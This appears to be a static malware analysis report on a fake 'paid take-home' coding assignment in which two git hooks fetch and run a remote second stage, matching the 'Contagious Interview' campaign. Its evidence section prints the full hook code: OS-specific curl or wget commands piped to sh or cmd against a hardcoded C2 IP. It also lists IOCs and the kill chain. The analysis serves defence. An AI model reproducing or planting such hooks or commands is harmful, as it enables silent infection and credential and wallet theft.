# analyze-for-swapnil — Full Static Analysis

**Target:** `~/scam-eval/extracted/` (extraction of `Fullstack.zip`) · **Date:** 2026-07-15
**Method:** static, READ-ONLY. Sample never executed; no second-stage fetched; C2 never contacted.

---

## VERDICT: 🔴 MALICIOUS — high confidence
A fake "paid full-stack take-home" that is a malware dropper. The payload is **two weaponized git hooks**
(`post-checkout`, `pre-commit`) that download and run a remote second stage on `git checkout`/`git commit`.
The PDF brief and the React+Express "Wallet Watchlist" app are **decoys**. Matches DPRK/Lazarus
**"Contagious Interview" / TaskJacker** (git-hook loader variant → BeaverTail/InvisibleFerret).

> **Scope note:** the working tree holds only the PDF; all 24 app files live in **git objects** and were read
> with read-only plumbing (`git show`/`ls-tree`). The hooks live in `.git/hooks/` and are the sole malware.

---

## Standard report (1–7)

**1. package.json + lockfiles.** No lockfiles present. Lifecycle scripts — **none malicious**:
- `client/package.json` → `{"dev":"vite","build":"vite build","preview":"vite preview"}`
- `server/package.json` → `{"dev":"node --watch src/index.js","start":"node src/index.js"}`
- **No** `preinstall`/`install`/`postinstall`/`prepare`/`prepublish`/`prestart`/`poststart`.

**2. Obfuscation.** None. Base64/hex/unicode/whitespace-padded/`atob`/`btoa`/`fromCharCode`/`unescape`
sweep across every tracked blob returned **zero** hits. The hooks are plain, unobfuscated `sh`.

**3. Process execution.** None in app source (no `child_process`/`exec`/`spawn`). **In the hooks:** the shell
itself executes a downloaded script via `| sh` / `| cmd` (see §9–§11).

**4. Network.** App source: only `http://localhost:4000` / `:5173` (benign). **Hooks:** hardcoded C2
`http://216.126.239.166` (see IOCs).

**5. Dynamic loading.** No `require()`/`import()` of remote code in source. **The hooks are the
download-then-run vector:** `curl … | sh`.

**6. Secret/credential access.** None in the shipped source (only `process.env.PORT`). Credential/wallet
theft is delegated to the **remote second stage**, which was not fetched.

**7. Suspicious/typosquatted deps.** None — `react`, `react-dom`, `react-router-dom`, `vite`,
`@vitejs/plugin-react` (client); `express`, `cors`, `uuid` (server). All mainstream, no typosquats.

---

## Deep extras (8–13)

**8. Deobfuscation.** Nothing to decode — no encoded blobs anywhere in the sample. (The hook is cleartext.)

**9. Payload/second-stage URL + trigger.** Second stage is fetched from
`http://216.126.239.166/728/728{m|l|w}`. **Triggers:** `.git/hooks/post-checkout` runs on **`git checkout`**;
`.git/hooks/pre-commit` runs on **`git commit`** — both are steps the PDF instructs the candidate to perform.

**10. Network endpoints / exfil.** Downloader = `curl -s -L` (macOS/Win) or `wget -qO-` (Linux), HTTP GET to
the three C2 paths. The **dropper itself sends no data**; what is exfiltrated (env, wallets, keys) is decided
by the un-fetched second stage — not determinable statically without detonating the C2 (not done).

**11. Kill chain.**
`Fake recruiter → Fullstack.zip (with .git) → victim runs "git checkout <branch>" per PDF →`
`post-checkout hook fires → OS fingerprint ($OSTYPE) → curl/wget http://216.126.239.166/728/728{m,l,w} -L`
`→ pipe into sh/cmd (in-memory exec) → output suppressed (>/dev/null 2>&1) & backgrounded (&) →`
`[second stage: infostealer/RAT — persistence + credential/wallet theft].`
Backup trigger: `git commit → pre-commit hook → same chain.`

**12. Attacker identity leaks.**
- Git author/committer: **`wondev_mum <wondev.mum@gmail.com>`** (all 3 commits).
- Timestamps/timezone: **2026-07-14, 12:22–12:24, UTC-0400** — three commits within ~2 minutes.
- No embedded `/Users`/`/home` paths, no hardcoded tokens/handles in source.

**13. Anti-analysis tricks.** Minimal — no sleep timers, no `uname`/`whoami`/geo checks, no VM/sandbox
detection in the hook. The only "evasion" is output suppression (`>/dev/null 2>&1`), backgrounding (`&`),
and an always-success exit so git proceeds normally. (Any sandbox/geo logic would live in the un-fetched
second stage.)

---

## EVIDENCE
- `Fullstack/.git/hooks/post-checkout` and `Fullstack/.git/hooks/pre-commit` (identical, 500 B), lines 4–10:
  ```sh
  case "$OSTYPE" in
    darwin*)  curl -s 'http://216.126.239.166/728/728m' -L | sh  > /dev/null 2>&1 &;;
    linux*)   wget -qO- 'http://216.126.239.166/728/728l' -L | sh  > /dev/null 2>&1 &;;
    msys*)    curl -s http://216.126.239.166/728/728w -L | cmd  > /dev/null 2>&1 &;;
    cygwin*)  curl -s http://216.126.239.166/728/728w -L | cmd  > /dev/null 2>&1 &;;
    *)        curl -s 'http://216.126.239.166/728/728m' -L | sh  > /dev/null 2>&1 &;;
  esac
  ```
- `Fullstack/.git/config` → `user.email = wondev.mum@gmail.com`, `user.name = wondev_mum`.
- Clean decoy: `server/src/index.js:20` `process.env.PORT || 4000`; `client/src/api/client.js:1`
  `... || "http://localhost:4000"`.

## IOCs
| Type | Value |
| --- | --- |
| C2 IP | `216.126.239.166` (HTTP) |
| Payload URLs | `http://216.126.239.166/728/728m` · `/728/728l` · `/728/728w` |
| Hook SHA-256 (both) | `f126186fe14d02e0d07f14d1ad3b0653abaaae9e099223dbae7513796452054f` |
| Container `Fullstack.zip` SHA-256 | `4bec2b8443bd1600a2239cdb4d77fc9e252785fa144b00f81dd3a25e73ec285e` |
| PDF SHA-256 | `ed517a74a9efc7a79ed4889b7c7ce36829824704fcf672bb915d0e934f589c2d` |
| Attacker email | `wondev.mum@gmail.com` |
| Attacker git name | `wondev_mum` |
| Dropped-file paths | `.git/hooks/post-checkout`, `.git/hooks/pre-commit` |
| Wallet addresses | none in sample (second stage not fetched) |

## WHAT IT DOES (plain English)
Disguised as a paid coding assignment, the repo hides two git hooks. The moment the victim runs the
`git checkout` the instructions tell them to (or later `git commit`s their work), a hook silently detects the
OS and downloads a matching script from `216.126.239.166`, then runs it immediately in the background with no
visible output. The dropper sends no data itself; the downloaded second stage is where credential/browser/
crypto-wallet theft and persistence happen (consistent with the crypto-themed decoy and the
BeaverTail/InvisibleFerret campaign). As extracted, the hooks are mode 644 (may not fire without the exec
bit) — treat as live regardless.

## Recommendations
- Block `216.126.239.166`; submit the container hash + IP to VirusTotal.
- Do not run git `checkout`/`commit`/`pull` inside the sample; read via `git show`/`ls-tree` only.
- Neutralize the local copy by deleting the two hook files.

*Prepared read-only. No code executed, no payload fetched, C2 not contacted.*
